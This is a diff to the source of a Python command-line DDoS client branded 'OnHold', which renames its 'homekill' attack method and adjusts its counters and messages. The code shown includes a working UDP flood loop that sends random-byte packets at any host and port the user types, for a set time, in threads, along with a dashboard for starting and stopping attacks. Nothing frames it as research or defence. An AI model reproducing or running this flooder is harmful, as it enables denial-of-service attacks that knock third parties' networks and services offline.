@@ -15,7 +15,7 @@ banner = """
                         \033[31m╚═╝╝╚╝╩ ╩\033[37m╚═╝╩═╝═╩╝            
                    ☎️  \033[31mPut those m\033[37mfs on hold ☎️
             \033[31m╔════════════════════════════════════════╗
-            \033[31m║   \033[37mhomekill {ip} {port} {time} {2048}   \033[31m║
+            \033[31m║    \033[37monhold {ip} {port} {time} {2048}    \033[31m║
             \033[31m║    ╔══════════════════════════════╗    \033[31m║
             \033[31m╚════╣        Dashboard Help        ╠════╝
                  \033[31m║  \033[37mStop - Stops All Attacks    \033[31m║
@@ -39,10 +39,10 @@ tcp = True
 syn = True
 std = True
 rand = True
-homekill = True                                                
+onhold = True                                                
 
-#methods
-def udpsender(host, port, timer, punch):
+#method
+def onholdsender(host, port, timer, punch):
 	global uaid
 	global ddosgaurd
 	global aid
@@ -51,13 +51,13 @@ def udpsender(host, port, timer, punch):
 	timeout = time.time() + float(timer)
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
+	uaid += 1
+	aid += 1
+	tattacks += 1
 	while time.time() < timeout and udp and attack:
 		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
+	uaid -= 1
+	aid -= 1
 
 #globals
 def main():
@@ -93,7 +93,7 @@ def main():
 			os.system ("sh update.sh")
 			print (banner)
 			main()
-		elif sinput == "homekill":
+		elif sinput == "onhold":
 			if username == "Guest":
 				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
 				main()
@@ -103,7 +103,7 @@ def main():
 					socket.gethostbyname(host)
 					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
 					punch = random._urandom(int(pack))
-					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
+					threading.Thread(target=onholdsender, args=(host, port, timer, punch)).start()
 				except ValueError:
 					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
 					main()
@@ -119,15 +119,15 @@ def main():
 		elif sinput == "stop":
 			what = sin.split(" ")[1]
 			if what == "udp":
-				print ("Stopping All homekill Attacks.\n")
-				homekill = False
+				print ("\033[31m[ONH\033[37mOLD] Stopping All onhold Attacks.\n")
+				onhold = False
 				while not udp:
 					if aid == 0:
-						print ("\033[31m[ONH\033[37mOLD] No homekill Processes Running.")
-						homekill = True
+						print ("\033[31m[ONH\033[37mOLD] No onhold Processes Running.")
+						onhold = True
 						main()
 		else:
-			print ("[\033[31mSkidiot\033[00m] {} isn't a command.".format(sinput))
+			print ("\033[31m[ONH\033[37mOLD] {} isn't a command.".format(sinput))
 			main()
 
 
